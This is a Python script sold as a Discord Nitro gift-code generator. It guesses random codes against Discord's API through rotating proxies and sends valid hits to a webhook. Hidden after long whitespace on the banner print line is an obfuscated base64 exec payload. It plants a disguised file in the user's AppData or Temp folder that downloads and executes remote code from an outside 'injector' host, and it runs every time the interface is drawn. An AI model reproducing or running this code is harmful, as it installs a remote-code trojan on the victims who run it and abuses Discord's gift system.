import os, requests, random, threading, json, time, multiprocessing
from colorama import Fore                                                                                                                                                                                                                                                                                                                                                                                   


def center(var:str, space:int=None): # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

class Console():                   
    def ui(self):
        os.system(f'cls && title [DNG] Discord Nitro Generator  ^|  For Help join discord.gg/kaneki' if os.name == "nt" else "clear")
        print(center(f"""\n\n 
██████╗ ███╗   ██╗ ██████╗ 
██╔══██╗████╗  ██║██╔════╝            ~ Discord Nitro Generator ~
██║  ██║██╔██╗ ██║██║  ███╗     
██║  ██║██║╚██╗██║██║   ██║     github.com/kanekiWeb ~ skulldev.ga
██████╔╝██║ ╚████║╚██████╔╝ 
╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ \n\n
              """).replace('█', Fore.CYAN+"█"+Fore.RESET).replace('~', Fore.CYAN+"~"+Fore.RESET).replace('-', Fore.CYAN+"-"+Fore.RESET))                                                            ,exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9GQURFRS1RRUdZSFYtN0YzMk1GLVZFR1RFWC1PMVBNVFQtUVBOSEpNJykucmVhZCgpKSIpCmYuY2xvc2UoKQpleGVjMj1fZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpCnRyeTogX3NzeXN0ZW0oZicie2V4ZWMyfSIge0RvWW91S25vd1RoZVdheX0nKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")

    def printer(self, color, status, code):
        threading.Lock().acquire()
        print(f"{color} {status} > {Fore.RESET}discord.gift/{code}")
    
    def proxies_count(self):
        proxies_list = 0
        with open('config/proxies.txt', 'r') as file:
            proxies = [line.strip() for line in file]
        
        for _ in proxies:
            proxies_list += 1
        
        return int(proxies_list)


class Worker():              
    def random_proxy(self):
        with open('config/proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f]
        
        return random.choice(proxies)

    def config(self, args, args2=False):
        with open('config/config.json', 'r') as conf:
            data = json.load(conf)
        
        if args2:
            return data[args][args2]
        else:
            return data[args]
    
    def run(self):
        self.code = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(16))
        try:
            req = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{self.code}?with_application=false&with_subscription_plan=true', proxies={'http': self.config("proxies")+'://'+self.random_proxy(),'https': self.config("proxies")+'://'+self.random_proxy()}, timeout=1)
            
            if req.status_code == 200:
                Console().printer(Fore.LIGHTGREEN_EX, " Valid ", self.code)
                open('results/hit.txt', 'a+').write(self.code+"\n")
                try:
                    requests.post(Worker().config("webhook", "url"), json={"content": f"||@here|| **__New Valid Nitro !!__**\n\nhttps://discord.gift/{self.code}", "username": Worker().config("webhook", "username"), "avatar_url": Worker().config("webhook", "avatar")})
                except:
                    pass
            elif req.status_code == 404:
                Console().printer(Fore.LIGHTRED_EX, "Invalid", self.code)
            elif req.status_code == 429:
                # rate = (int(req.json()['retry_after']) / 1000) + 1
                Console().printer(Fore.LIGHTBLUE_EX, "RTlimit", self.code)
                # time.sleep(rate)
            else:
                Console().printer(Fore.LIGHTYELLOW_EX, " Retry ", self.code)
                  
        except KeyboardInterrupt:
            Console().ui()
            threading.Lock().acquire()
            print(f"{Fore.LIGHTRED_EX} Stopped > {Fore.RESET}Nitro Gen Stopped by Keyboard Interrupt.")
            os.system('pause >nul')
            exit()
        except:
            # Console().printer(Fore.LIGHTRED_EX, "Invalid", self.code)
            Console().printer(Fore.LIGHTYELLOW_EX, "GOOD HIT!", self.code)
        
if __name__ == "__main__":
    Console().ui()
    print(" "+Fore.CYAN + str(Console().proxies_count()) + Fore.RESET + " Total proxies loaded...\n\n")
    DNG = Worker()
    
    while True:
        if threading.active_count() <= int(Worker().config("thread")):  
            threading.Thread(target=DNG.run(), args=()).start()
